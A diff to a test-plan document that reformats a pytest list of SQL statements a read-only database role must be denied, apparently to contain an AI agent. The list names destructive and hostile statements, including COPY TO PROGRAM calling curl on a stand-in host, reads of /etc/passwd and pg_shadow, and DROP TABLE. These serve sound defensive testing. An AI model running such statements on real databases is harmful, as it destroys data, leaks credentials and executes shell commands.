@@ -58,22 +58,25 @@ Covers: migrations up and down; role and grant creation; vector round-trip and A
 **These gate every release.** Each asserts the read-only role is *denied*. A test here that passes when it should fail means the containment story is broken.
 
 ```python
-@pytest.mark.parametrize("statement", [
-    "INSERT INTO orders (id) VALUES (1)",
-    "UPDATE orders SET total_amount = 0",
-    "DELETE FROM orders",
-    "TRUNCATE orders",
-    "CREATE TABLE evil (id int)",
-    "DROP TABLE orders",
-    "ALTER TABLE orders ADD COLUMN x int",
-    "CREATE INDEX ON orders (id)",
-    "COPY orders TO PROGRAM 'curl evil.example'",
-    "SELECT pg_read_file('/etc/passwd')",
-    "SELECT pg_ls_dir('/')",
-    "SELECT * FROM agent_meta.query_audit",
-    "SELECT * FROM agent_meta.sessions",
-    "SELECT * FROM pg_shadow",
-])
+@pytest.mark.parametrize(
+    "statement",
+    [
+        "INSERT INTO orders (id) VALUES (1)",
+        "UPDATE orders SET total_amount = 0",
+        "DELETE FROM orders",
+        "TRUNCATE orders",
+        "CREATE TABLE evil (id int)",
+        "DROP TABLE orders",
+        "ALTER TABLE orders ADD COLUMN x int",
+        "CREATE INDEX ON orders (id)",
+        "COPY orders TO PROGRAM 'curl evil.example'",
+        "SELECT pg_read_file('/etc/passwd')",
+        "SELECT pg_ls_dir('/')",
+        "SELECT * FROM agent_meta.query_audit",
+        "SELECT * FROM agent_meta.sessions",
+        "SELECT * FROM pg_shadow",
+    ],
+)
 def test_readonly_role_is_denied(ro_connection, statement):
     with pytest.raises(psycopg.errors.InsufficientPrivilege):
         ro_connection.execute(statement)
